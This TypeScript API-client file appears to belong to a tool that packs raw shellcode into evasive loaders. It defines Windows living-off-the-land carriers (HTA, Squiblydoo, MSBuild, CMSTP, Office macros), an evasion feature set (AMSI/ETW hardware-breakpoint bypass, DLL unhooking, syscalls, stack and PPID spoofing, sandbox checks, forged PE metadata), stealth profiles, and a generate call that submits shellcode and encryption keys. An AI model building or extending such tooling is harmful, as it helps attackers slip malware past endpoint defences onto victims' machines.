import { client } from './client'

export type LoaderType =
  | 'Binary' | 'Dll' | 'AppDomain' | 'Injector' | 'Rundll32'
  | 'Wsf' | 'Hta' | 'Regsvr32Sct' | 'MsBuild' | 'Cmstp' | 'WmicXsl'
  | 'DocxMacro' | 'XlsxMacro' | 'InstallUtil'
export type Encryption  = 'Aes256' | 'Chacha20'
export type Profile = 'stealth' | 'balanced' | 'aggressive'

export interface LoaderTypeMeta {
  type:  LoaderType
  label: string
  ext:   string
}

export const LOADER_GROUPS: Record<string, LoaderTypeMeta[]> = {
  'PE Compiled': [
    { type: 'Binary',      label: 'Binary',      ext: '.exe' },
    { type: 'Dll',         label: 'DLL',         ext: '.dll' },
    { type: 'Injector',    label: 'Injector',    ext: '.exe' },
    { type: 'Rundll32',    label: 'Rundll32',    ext: '.dll' },
  ],
  'Script LOLBIN': [
    { type: 'Wsf',         label: 'WSF',         ext: '.wsf' },
    { type: 'Hta',         label: 'HTA',         ext: '.hta' },
    { type: 'Regsvr32Sct', label: 'Squiblydoo',  ext: '.sct' },
    { type: 'MsBuild',     label: 'MSBuild',     ext: '.csproj' },
    { type: 'Cmstp',       label: 'CMSTP',       ext: '.inf' },
    { type: 'WmicXsl',     label: 'WMIC XSL',    ext: '.xsl' },
  ],
  'Office Macro': [
    { type: 'DocxMacro',   label: 'Word VBA',    ext: '.bas (paste manually)' },
    { type: 'XlsxMacro',   label: 'Excel VBA',   ext: '.bas (paste manually)' },
  ],
  '.NET LOLBIN': [
    { type: 'AppDomain',   label: 'AppDomain',   ext: '.dll + .config' },
    { type: 'InstallUtil', label: 'InstallUtil',  ext: '.dll' },
  ],
}

export const ALL_FEATURES = [
  'DirectSyscall', 'UnhookDisk', 'UnhookKnownDlls',
  'ModuleStomp',   'SleepEncrypt', 'StackSpoof',
  'SandboxDomain', 'SandboxUser',  'PpidSpoof',
  'AmsiHwbp',      'EtwHwbp',      'PeSpoofing',
  'Staged',        'AppDomain',     'ThreadlessInject',
  'Compress',      'ExcelComExec',
] as const
export type Feature = typeof ALL_FEATURES[number]

export const PROFILE_FEATURES: Record<Profile, Feature[]> = {
  stealth:    ['DirectSyscall', 'UnhookKnownDlls', 'ModuleStomp', 'PpidSpoof', 'SleepEncrypt', 'StackSpoof', 'AmsiHwbp', 'EtwHwbp'],
  balanced:   ['DirectSyscall', 'SleepEncrypt', 'AmsiHwbp', 'EtwHwbp'],
  aggressive: ['AmsiHwbp'],
}

export const PROFILE_ENCRYPTION: Record<Profile, Encryption> = {
  stealth:    'Aes256',
  balanced:   'Chacha20',
  aggressive: 'Aes256',
}

export interface PeMetadataReq {
  company_name: string; file_description: string; product_name: string
  file_version: string; original_filename: string; legal_copyright: string
  sign: boolean; cert_pem?: string
}

export type AppDomainHostBinary = 'MSBuild.exe' | 'FileHistory.exe'

export interface AppDomainReq {
  clr_version?: string
  net_version?: string
  host_binary?: AppDomainHostBinary
}

/** `.config` sidecar filename for an AppDomain host binary — single source of
 *  truth, mirrors `template_engine::appdomain_config_filename` on the Rust side. */
export function appdomainConfigFilename(host?: AppDomainHostBinary | string | null): string {
  const h = (host && host.length > 0) ? host : 'MSBuild.exe'
  return `${h}.config`
}

export interface StagedReq {
  pid:         string
  jwt:         string
  host:        string
  scheme?:     'http' | 'https'
  user_agent?: string
}

export interface GenerateRequest {
  loader_type: LoaderType; features: Feature[]
  encryption: Encryption; shellcode_hex: string
  key_hex: string; iv_hex: string
  pe_config?: PeMetadataReq; appdomain_config?: AppDomainReq
  staged?: StagedReq
}

export interface GenerateResponse { job_id: string }

export async function generate(req: GenerateRequest): Promise<GenerateResponse> {
  const { data } = await client.post<GenerateResponse>('/generate', req)
  return data
}
